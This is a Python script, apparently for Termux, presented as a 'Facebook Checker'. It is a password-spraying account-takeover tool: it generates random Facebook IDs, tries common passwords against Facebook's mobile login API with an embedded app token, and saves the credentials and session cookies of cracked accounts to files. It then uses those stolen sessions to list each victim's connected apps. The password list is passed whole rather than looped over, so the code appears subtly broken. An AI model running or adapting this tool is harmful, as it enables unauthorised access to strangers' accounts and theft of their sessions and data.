import os
import sys
import time
import random
import string
import requests
import re
from concurrent.futures import ThreadPoolExecutor

# ==========================================
# VIR TOOL - Facebook Checker & Apps Analyzer
# Coded by: ABDOU DUXE
# User: @ABDOU_DUXE
# ==========================================

# الألوان
BLUE = '\033[1;34m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
GREEN = '\033[1;32m'
RED = '\033[1;31m'
RESET = '\033[0m'

LOGO = f"""{BLUE}
███████╗██████╗░░░░░░░██╗░░░██╗██╗██████╗░
██╔════╝██╔══██╗░░░░░░██║░░░██║██║██╔══██╗
█████╗░░██████╦╝█████╗╚██╗░██╔╝██║██████╔╝
██╔══╝░░██╔══██╗╚════╝░╚████╔╝░██║██╔═══╝░
██║░░░░░██████╦╝░░░░░░░░╚██╔╝░░██║██║░░░░░
╚═╝░░░░░╚═════╝░░░░░░░░░░╚═╝░░░╚═╝╚═╝░░░░░
{WHITE}==============================================
{BLUE}[•] USER : {WHITE}@ABDOU_DUXE
{BLUE}[•] TOOL : {WHITE}VIR Facebook Checker
{BLUE}[•] TYPE : {WHITE}Termux Security Tool
{WHITE}=============================================={RESET}
"""

def clear():
    os.system('clear')
    print(LOGO)

def get_apps(cok):
    try:
        session = requests.Session()
        coki = {}
        for hh in cok.split(';'):
            key, val = hh.split('=', 1)
            coki[key.strip()] = val.strip()
        head = {'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+'}
        
        # جلب التطبيقات النشطة
        rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=head).text
        # جلب التطبيقات المنتهية
        rr2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=head).text
        
        result = "Active Apps:\n"
        if 'no active apps' in rr1.lower():
            result += "No Apps\n"
        else:
            apps = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr1)
            dates = re.findall(r'(?:تمت الإضافة في|Added on)\s*([^<]+)</p>', rr1)
            for idx, app in enumerate(apps):
                d = dates[idx].strip() if idx < len(dates) else "Unknown Date"
                result += f"[{idx+1}] {app.strip()} - {d}\n"
            if not apps: result += "None\n"
        
        result += "\nExpired Apps:\n"
        apps2 = re.findall(r'data-testid="app_info_text">([^<]+)</span>', rr2)
        dates2 = re.findall(r'(?:Kedaluwarsa pada|انتهت الصلاحية في|Expired on)\s*([^<]+)</p>', rr2)
        for idx, app in enumerate(apps2):
            d = dates2[idx].strip() if idx < len(dates2) else "Unknown Date"
            result += f"[{idx+1}] {app.strip()} - {d}\n"
        if not apps2: result += "None\n"
        
        return result
    except:
        return "Failed to get apps."

def check_account(uid, pw):
    try:
        url = "https://b-graph.facebook.com/auth/login"
        
        data = {
            'adid': str(random.randint(1000000000000000, 9999999999999999)),
            'format': 'json',
            'device_id': str(random.randint(1000000000000000, 9999999999999999)),
            'email': uid,
            'password': pw,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        headers = {
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G975F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/250.0.0.40.119;]',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
        }
        
        response = requests.post(url, data=data, headers=headers, timeout=10)
        json_res = response.json()
        
        if 'session_key' in json_res:
            cookies = ";".join([f"{c['name']}={c['value']}" for c in json_res.get('session_cookies', [])])
            apps_info = get_apps(cookies)
            
            print(f"\n{GREEN}[OK] {uid} | {pw}{RESET}")
            print(f"{CYAN}--- Connected Apps ---{RESET}\n{apps_info}")
            
            with open('/sdcard/VIR-OK.txt', 'a') as f:
                f.write(f"{uid}|{pw}|{cookies}\n")
            with open('/sdcard/VIR-APPS.txt', 'a') as f:
                f.write(f"ID: {uid}\n{apps_info}\n{'-'*30}\n")
            return True
            
        elif 'error' in json_res:
            error_msg = json_res['error'].get('message', '')
            if 'www.facebook.com' in error_msg or 'checkpoint' in error_msg.lower():
                print(f"\n{RED}[CP] {uid} | {pw}{RESET}")
                with open('/sdcard/VIR-CP.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                return False
    except:
        pass
    return False

def show_help():
    clear()
    print(f"""{WHITE}
    [*] How to use VIR Tool:
    1. Option 1: Generates random old IDs and checks them.
    2. Option 2: The tool will check IDs and print connected apps.
    3. You can add passwords separated by comma (e.g., 123456,12345678).
    4. Results are saved in /sdcard/VIR-OK.txt and /sdcard/VIR-APPS.txt.
    5. If you get a Checkpoint (CP), the account is locked or needs verification.
    {RESET}""")
    input(f"{BLUE}Press Enter to return...{RESET}")

def main():
    while True:
        clear()
        print(f"{BLUE}[1] {WHITE}Start Checker (Random IDs)")
        print(f"{BLUE}[2] {WHITE}Check & Show Connected Apps")
        print(f"{BLUE}[3] {WHITE}Instructions & Help")
        print(f"{BLUE}[0] {WHITE}Exit")
        print(f"{BLUE}-----------------------------------{RESET}")
        
        choice = input(f"{BLUE}[?] Choose: {WHITE}")
        
        if choice in ['0', '00']:
            sys.exit()
            
        elif choice in ['3']:
            show_help()
            
        elif choice in ['1', '2']:
            try:
                count = int(input(f"{WHITE}[?] How many IDs to check (e.g., 5000): {RESET}"))
            except:
                count = 1000
                
            pwx = input(f"{WHITE}[?] Enter Passwords (separated by comma): {RESET}").split(',')
            
            print(f"{WHITE}[*] Generating {count} IDs...{RESET}")
            ids = []
            for _ in range(count):
                prefix = '100000'
                random_id = prefix + str(random.randint(111111111, 999999999))
                ids.append(random_id)
                
            print(f"{WHITE}[*] Starting...{RESET}\n")
            
            with ThreadPoolExecutor(max_workers=30) as executor:
                for uid in ids:
                    executor.submit(check_account, uid, pwx)

if __name__ == "__main__":
    main()